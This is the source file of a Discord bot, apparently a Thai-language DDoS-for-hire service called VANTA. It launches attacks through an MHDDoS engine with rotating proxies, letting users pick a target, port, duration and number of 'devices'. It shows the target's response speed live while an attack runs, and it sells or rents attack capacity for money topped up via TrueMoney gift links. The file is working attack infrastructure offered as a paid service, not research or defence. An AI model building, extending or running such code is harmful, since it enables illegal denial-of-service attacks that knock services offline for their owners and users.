# bot.py
import asyncio
import os
import re
import time
import discord
from discord.ext import commands, tasks

from config import *
from database import Database
from mhddos_engine import MHDDoSEngine
from proxy_manager import ProxyManager
from truemoney import TrueMoneyClient
from ui_components import (
    AttackPanel, build_attack_embed, build_module_embed,
    build_attack_running_embed, ModuleView,
    ShopView, build_shop_embed, DeviceTypeView, PeriodView, QuantityView,
    RENT_PRICES, BUY_PRICES,
)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)
db = Database()
engine = MHDDoSEngine()
proxy_mgr = ProxyManager()
tm = TrueMoneyClient()

active_attacks: dict[int, dict] = {}  # user_id → {task, message, start, duration, ...}


# ============================================================
# Helpers
# ============================================================
def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID


async def deny(interaction: discord.Interaction, text: str):
    await interaction.response.send_message(text, ephemeral=True)


def is_forbidden(target: str) -> bool:
    t = target.lower()
    if any(t.endswith(tld) or f"{tld}/" in t for tld in FORBIDDEN_TLDS):
        return True
    for ip in FORBIDDEN_IPS:
        if ip in t:
            return True
    return False


# ============================================================
# Events
# ============================================================
@bot.event
async def on_ready():
    os.makedirs("data", exist_ok=True)
    await db.init()
    print(f"[VANTA] logged in as {bot.user}")

    # start proxy refresh
    asyncio.create_task(proxy_mgr.auto_refresh_loop())

    # persistent view สำหรับ panel
    bot.add_view(AttackPanel(OWNER_ID))
    bot.add_view(ShopView())

    # ส่ง panel ครั้งแรกถ้ายังไม่มี
    # (รันด้วย !setup เพื่อส่ง panel)


# ============================================================
# !setup — ส่ง panel DDOS
# ============================================================
@bot.command()
async def setup(ctx):
    if not is_owner(ctx.author.id):
        return
    await ctx.send(embed=build_attack_embed(), view=AttackPanel(OWNER_ID))


@bot.command()
async def shop(ctx):
    if not is_owner(ctx.author.id):
        return
    await ctx.send(embed=build_shop_embed(), view=ShopView())


# ============================================================
# Attack flow
# ============================================================
async def handle_attack_submit(interaction: discord.Interaction, modal):
    user_id = interaction.user.id

    if not is_owner(user_id):
        await interaction.response.send_message(
            "ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงถุ้ย", ephemeral=True
        )
        return

    user = await db.get_user(user_id)
    if user["banned"]:
        await interaction.response.send_message(
            "มึงโดนแบนอยู่ ใช้บอทไม่ได้", ephemeral=True
        )
        return

    target = modal.target.value.strip()
    try:
        port = int(modal.port.value)
        duration = min(int(modal.duration.value), MAX_DURATION)
        devices = int(modal.device.value)
    except ValueError:
        await interaction.response.send_message(
            "ใส่ตัวเลขให้ถูกต้อง (Port / Time / Device)", ephemeral=True
        )
        return

    # ตรวจ device
    if devices > user["devices"]:
        await interaction.response.send_message(
            f"มีDevice ไม่พอนะ ไปซื้อเพิ่มด้วย (มี {user['devices']} เครื่อง)",
            ephemeral=True,
        )
        return

    # ตรวจเป้าหมายต้องห้าม
    if is_forbidden(target):
        warns = await db.add_warning(user_id)
        if warns >= MAX_WARNINGS:
            await interaction.response.send_message(
                f"อย่ายิงเว็บต้องห้ามอ่านด้วยอีโง่ เตือนรอบ {warns} — ครบ 3 ครั้งโดนแบน",
                ephemeral=True,
            )
        else:
            await interaction.response.send_message(
                f"อย่ายิงเว็บต้องห้ามอ่านด้วยอีโง่ เตือนรอบ {warns}",
                ephemeral=True,
            )
        return

    # ส่ง embed เลือก module
    view = ModuleView(user_id, target, port, duration, devices)
    await interaction.response.send_message(
        embed=build_module_embed(), view=view, ephemeral=True
    )


async def start_attack(interaction: discord.Interaction, module: str,
                       target: str, port: int, duration: int, devices: int):
    user_id = interaction.user.id
    user = await db.get_user(user_id)

    if engine.is_running(user_id):
        await interaction.response.send_message(
            "มึงมี attack รันอยู่แล้ว", ephemeral=True
        )
        return

    # เขียน proxy ตาม device
    n = proxy_mgr.write_for_devices(devices)

    # log
    await db.log_attack(user_id, target, port, duration, module)

    # เริ่ม attack
    try:
        proc = await engine.start(user_id, module, target, port, duration, devices)
    except Exception as e:
        await interaction.response.send_message(
            f"เริ่มไม่สำเร็จ: {e}", ephemeral=True
        )
        return

    embed = build_attack_running_embed(
        target=f"{target}:{port}", time_left=duration,
        speed="measuring...", module=module,
    )
    await interaction.response.send_message(embed=embed)
    msg = await interaction.original_response()

    # task อัปเดตทุก 1 วิ
    state = {
        "target": target, "port": port, "duration": duration,
        "module": module, "devices": devices,
        "start": time.time(), "message": msg, "proc": proc,
    }
    active_attacks[user_id] = state
    task = asyncio.create_task(_attack_loop(user_id, state))
    state["task"] = task


async def _attack_loop(user_id: int, state: dict):
    msg: discord.Message = state["message"]
    target_full = f"{state['target']}:{state['port']}"
    while True:
        elapsed = time.time() - state["start"]
        left = max(0, state["duration"] - int(elapsed))
        speed = await _measure_speed(state["target"], state["port"])
        embed = build_attack_running_embed(
            target=target_full, time_left=left,
            speed=speed, module=state["module"],
        )
        try:
            await msg.edit(embed=embed)
        except discord.HTTPException:
            pass

        if left <= 0:
            await engine.stop(user_id)
            active_attacks.pop(user_id, None)
            try:
                await msg.edit(
                    embed=discord.Embed(
                        title="✅ จบการโจมตี",
                        color=discord.Color.green(),
                        description=f"ยิง `{target_full}` ครบ {state['duration']}s แล้ว",
                    )
                )
            except Exception:
                pass
            return

        await asyncio.sleep(1)


async def _measure_speed(target: str, port: int) -> str:
    """วัดความเร็วปลายทาง (ms หรือ Mbps โดยประมาณ)"""
    import aiohttp
    host = target.split("//")[-1].split("/")[0]
    url = target if target.startswith("http") else f"http://{host}:{port}"
    try:
        start = time.time()
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=5) as r:
                data = await r.read()
        ms = int((time.time() - start) * 1000)
        kbps = (len(data) / 1024) / max(0.001, (time.time() - start))
        return f"{ms}ms / {kbps:.1f} KB/s"
    except Exception:
        return "offline / timeout"


# ============================================================
# !device
# ============================================================
@bot.command()
async def device(ctx, member: discord.Member = None, amount: str = None, duration: str = "TH"):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    if member is None or amount is None:
        await ctx.send("ใช้: `!device @user +1 1h` (TH = ถาวร)")
        return

    sign = 1 if amount.startswith("+") else -1 if amount.startswith("-") else 1
    try:
        num = int(re.sub(r"[^0-9]", "", amount) or "0")
    except ValueError:
        await ctx.send("จำนวนไม่ถูกต้อง")
        return

    if sign < 0:
        new = await db.add_devices(member.id, -num)
        await ctx.send(f"ลบ {num} device จาก {member.mention} — เหลือ {new}")
        return

    new = await db.add_devices(member.id, num)
    if duration.upper() != "TH":
        # เก็บ rental record (ตัดตามเวลาผ่าน task แยก)
        from datetime import datetime, timedelta
        if duration.endswith("h"):
            delta = timedelta(hours=int(duration[:-1]))
        elif duration.endswith("d"):
            delta = timedelta(days=int(duration[:-1]))
        else:
            delta = timedelta(days=30)
        await db.add_balance(member.id, 0, "rental", f"device +{num} {duration}")
        # ตั้งเวลาลบ
        async def _expire(uid, n, sec):
            await asyncio.sleep(sec)
            await db.add_devices(uid, -n)
        asyncio.create_task(_expire(member.id, num, int(delta.total_seconds())))

    await ctx.send(f"เพิ่ม {num} device ให้ {member.mention} — รวม {new}")


# ============================================================
# !b / !ub
# ============================================================
@bot.command()
async def b(ctx, member: discord.Member):
    if not is_owner(ctx.author.id):
        return
    await db.set_ban(member.id, True)
    await ctx.send(f"แบน {member.mention} แล้ว")


@bot.command()
async def ub(ctx, member: discord.Member):
    if not is_owner(ctx.author.id):
        return
    await db.set_ban(member.id, False)
    await ctx.send(f"ปลดแบน {member.mention} แล้ว")


# ============================================================
# Shop flows
# ============================================================
async def shop_device_type_selected(interaction: discord.Interaction, mode: str):
    if mode == "rent":
        await interaction.response.send_message(
            "เลือกช่วงเวลา:", view=PeriodView(), ephemeral=True
        )
    else:
        await interaction.response.send_message(
            "เลือกจำนวน:", view=QuantityView("buy"), ephemeral=True
        )


async def shop_period_selected(interaction: discord.Interaction, period: str):
    await interaction.response.send_message(
        f"เลือกจำนวน (เช่า {period}):",
        view=QuantityView("rent", period), ephemeral=True,
    )


async def shop_quantity_selected(interaction: discord.Interaction, mode: str,
                                 period: str | None, qty: int):
    user_id = interaction.user.id
    user = await db.get_user(user_id)

    if mode == "rent":
        price = RENT_PRICES.get(period, {}).get(qty)
        if price is None:
            await interaction.response.send_message("ไม่พบราคา", ephemeral=True)
            return
    else:
        price = BUY_PRICES.get(qty)
        if price is None:
            await interaction.response.send_message("ไม่พบราคา", ephemeral=True)
            return

    if user["balance"] < price:
        await interaction.response.send_message(
            f"เงินไม่พอ (มี {user['balance']:.0f}💵 ต้องใช้ {price}💵)",
            ephemeral=True,
        )
        return

    if mode == "buy" and user["devices"] + qty > MAX_DEVICES_PURCHASE:
        await interaction.response.send_message(
            f"ซื้อไม่เกิน {MAX_DEVICES_PURCHASE} device (มีอยู่ {user['devices']})",
            ephemeral=True,
        )
        return

    await db.add_balance(user_id, -price, "purchase", f"{mode} {qty} {period or ''}")
    new_dev = await db.add_devices(user_id, qty)
    new_bal = (await db.get_user(user_id))["balance"]

    # DM
    try:
        await interaction.user.send(
            f"ซื้อสำเร็จ! ได้ {qty} device — เหลือ {new_dev} device\n"
            f"เงินเหลือ {new_bal:.0f}💵"
        )
    except discord.Forbidden:
        pass

    await interaction.response.send_message(
        f"ซื้อสำเร็จ {qty} device — เหลือเงิน {new_bal:.0f}💵", ephemeral=True
    )

    # แจ้ง log
    log = bot.get_channel(LOG_CHANNEL_ID)
    if log:
        await log.send(
            f"🛒 **{interaction.user}** {mode} {qty} device "
            f"({period or 'buy'}) — {price}💵 — เหลือ {new_bal:.0f}💵"
        )


# ============================================================
# Topup (TrueMoney)
# ============================================================
@bot.command()
async def topup(ctx, link: str = None):
    user_id = ctx.author.id
    if not link:
        await ctx.send("ใช้: `!topup <ลิงก์ซองทรูมันนี่>`")
        return

    result = await tm.redeem(link)
    if not result["success"]:
        await ctx.send("รับซองไม่สำเร็จ — ตรวจสอบลิงก์อีกครั้ง")
        return

    amount = result["amount"]
    new_bal = await db.add_balance(user_id, amount, "topup", link)
    user = await db.get_user(user_id)
    await db.update_user(user_id, total_deposited=user["total_deposited"] + amount)

    await ctx.send(f"เติมเงินสำเร็จ {amount:.0f}💵 — เหลือ {new_bal:.0f}💵")

    log = bot.get_channel(LOG_CHANNEL_ID)
    if log:
        await log.send(
            f"💰 **{ctx.author}** เติม {amount:.0f}💵 — เหลือ {new_bal:.0f}💵"
        )


# ============================================================
# Run
# ============================================================
if __name__ == "__main__":
    bot.run(BOT_TOKEN)